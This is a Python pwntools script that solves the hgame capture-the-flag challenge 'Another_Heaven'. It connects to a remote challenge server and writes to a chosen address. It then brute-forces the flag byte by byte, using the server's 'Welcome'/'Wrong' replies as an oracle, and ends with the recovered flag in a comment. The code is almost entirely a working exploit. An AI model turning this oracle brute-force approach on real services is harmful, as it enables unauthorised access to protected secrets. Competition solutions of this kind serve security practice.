#-*- coding:utf-8 -*-
from pwn import*
import string,base64
context.log_level = 'debug'
flag_addr = 6300000
def leak(var,addr):
	#p = process('Another_Heaven')
	p = remote('47.103.214.163',21001)
	elf = ELF('Another_Heaven')
	p.recv()
	p.sendline(str(addr))
	p.sendline('\x00E99p1ant')
	p.sendlineafter('Password:',var)
	data = p.recv()
	p.close()
	if data.startswith("Welcome!"):
		return var
	elif data.startswith("Wrong"):
		return None
FLAG = 'hgame{'
addr = 6300000+7
for n in range(0,64):
	if FLAG.endswith('}'):
		break
	for i in string.printable:
		tmp = leak((FLAG+i),addr)
		if tmp == None:
			continue
		else:
			FLAG+=i
			addr +=1
			break
log.success('FLAG:\t'+FLAG)
#hgame{VGhlX2Fub3RoZXJfd2F5X3RvX2hlYXZlbg==}
